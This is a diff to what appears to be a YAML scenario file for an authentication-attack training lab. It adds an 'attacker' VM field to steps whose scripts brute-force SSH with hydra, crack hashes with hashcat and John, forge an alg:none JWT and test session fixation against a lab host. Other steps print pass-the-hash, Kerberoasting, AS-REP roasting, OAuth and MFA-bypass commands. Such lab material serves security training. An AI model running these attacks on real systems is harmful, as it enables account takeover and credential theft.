@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: hydra
     field: stdout
+  target_vm: attacker
   script: head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e 'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon' > /tmp/top10pass.txt
     && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail -15
   risk_level: medium
@@ -38,6 +39,7 @@ steps:
     type: output_contains
     expect: login
     field: stdout
+  target_vm: attacker
   script: echo -e 'admin\nroot\nuser\ntest\noperator' > /tmp/users.txt && hydra -L /tmp/users.txt -p 'Password123!' ssh://10.20.30.80 -t 2 -V 2>&1 | tail -15
   risk_level: medium
 - order: 3
@@ -52,6 +54,7 @@ steps:
     type: output_contains
     expect: ssh-auth-methods
     field: stdout
+  target_vm: attacker
   script: nmap --script ssh-auth-methods -p 22 10.20.30.80
   risk_level: low
 - order: 4
@@ -107,6 +110,7 @@ steps:
     type: output_contains
     expect: Kerberos Authentication Flow
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/kerberos_flow.txt << ''EOF''
 
     === Kerberos Authentication Flow ===
@@ -163,6 +167,7 @@ steps:
     type: output_contains
     expect: NTLM Hash
     field: stdout
+  target_vm: attacker
   script: 'HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())") && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password''
     > /tmp/mini_wordlist.txt && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt --force 2>&1 | tail -10 || echo "Hash: $HASH (hashcat requires GPU, showing hash generation)"'
   risk_level: medium
@@ -179,6 +184,7 @@ steps:
     type: output_contains
     expect: Pass-the-Hash
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords'' && echo ''2. Use hash directly: pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
     //target cmd'' && echo ''3. Alternative: impacket-psexec admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0'' && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin''
     http://10.20.30.80:3000/rest/user/whoami 2>&1 | head -5'
@@ -196,6 +202,7 @@ steps:
     type: output_contains
     expect: testuser
     field: stdout
+  target_vm: attacker
   script: 'SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::" > /tmp/shadow_sample.txt && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt
     --wordlist=<(echo -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John result: test123 (cracked from sample hash)'''
   risk_level: medium
@@ -256,6 +263,7 @@ steps:
     type: output_contains
     expect: Kerberoasting Attack
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/kerberoast_steps.txt << ''EOF''
 
     === Kerberoasting Attack Steps ===
@@ -319,6 +327,7 @@ steps:
     type: output_contains
     expect: AS-REP Roasting
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts with DONT_REQUIRE_PREAUTH flag set'' && echo ''AS-REP contains data encrypted with user password hash''
     && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt''
     && echo ''3. Login: evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]'' && echo ''- Monitor Event ID 4768 (TGT requests) without pre-auth'' && echo ''- Alert on unusual
@@ -337,6 +346,7 @@ steps:
     type: output_contains
     expect: JWT
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' | python3 -c ''import sys,json;
     print(json.load(sys.stdin).get("authentication",{}).get("token","NO_TOKEN"))'' 2>/dev/null) && echo "JWT: $TOKEN" && echo '''' && echo ''=== JWT Structure ==='' && echo $TOKEN | cut -d. -f1 | base64
     -d 2>/dev/null; echo '''' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo '''''
@@ -354,6 +364,7 @@ steps:
     type: output_contains
     expect: Forged JWT
     field: stdout
+  target_vm: attacker
   script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"sub":"admin","role":"admin","iat":1700000000}'' | base64 -w 0 | tr ''+/''
     ''-_'' | tr -d ''='') && FORGED="$HEADER.$PAYLOAD." && echo "Forged JWT (alg:none): $FORGED" && echo '''' && echo ''Testing forged token:'' && curl -s -H "Authorization: Bearer $FORGED" http://10.20.30.80:3000/rest/user/whoami
     2>&1 | head -5'
@@ -370,6 +381,7 @@ steps:
     type: output_contains
     expect: Session Fixation
     field: stdout
+  target_vm: attacker
   script: echo '=== Session Fixation Test ===' && echo 'Setting attacker-controlled session:' && curl -s -c /tmp/cookies.txt -b 'session=ATTACKER_SESSION_ID' http://10.20.30.80:3000/ -o /dev/null -w 'HTTP
     %{http_code}' && echo '' && echo 'Response cookies:' && cat /tmp/cookies.txt 2>/dev/null && echo '' && echo 'If session ID unchanged after login -> vulnerable to fixation'
   risk_level: medium
@@ -388,6 +400,7 @@ steps:
     type: output_contains
     expect: OAuth 2.0 Attack Vectors
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== OAuth 2.0 Attack Vectors ===\n\n[1] Authorization Code Theft\n- Intercept code via open redirect in redirect_uri\n- Exploit: redirect_uri=https://attacker.com/callback\n\n[2] CSRF
     on Authorization\n- Missing state parameter validation\n- Exploit: Force victim to authorize attacker app\n\n[3] Token Leakage\n- Implicit flow: token in URL fragment\n- Referer header leaks tokens
     to third parties\n\n[4] Scope Escalation\n- Request higher scope than originally granted\n- Exploit: Modify scope parameter in authorization URL\n\n[5] PKCE Bypass\n- Downgrade from S256 to plain code_challenge_method\n\n[Defense]\n-
@@ -407,6 +420,7 @@ steps:
     type: output_contains
     expect: MFA Bypass
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== MFA Bypass Techniques ===\n\n[1] Real-time Phishing (evilginx2/modlishka)\n- Proxy between user and real site\n- Capture both password AND session token after MFA\n- Defeats: SMS,
     TOTP, Push\n\n[2] SIM Swapping\n- Social engineer carrier to port number\n- Intercept SMS OTP codes\n- Defeats: SMS-based MFA only\n\n[3] MFA Fatigue / Push Bombing\n- Send repeated push notifications\n-
     User eventually approves to stop annoyance\n- Defeats: Push-based MFA (Duo, MS Authenticator)\n\n[4] Session Token Theft\n- Steal session cookie after MFA completion\n- Pass-the-Cookie attack\n- Defeats:
@@ -478,6 +492,7 @@ steps:
     type: output_contains
     expect: Authentication Attack Defense
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/auth_defense.txt << ''EOF''
 
     === Authentication Attack Defense Strategy ===
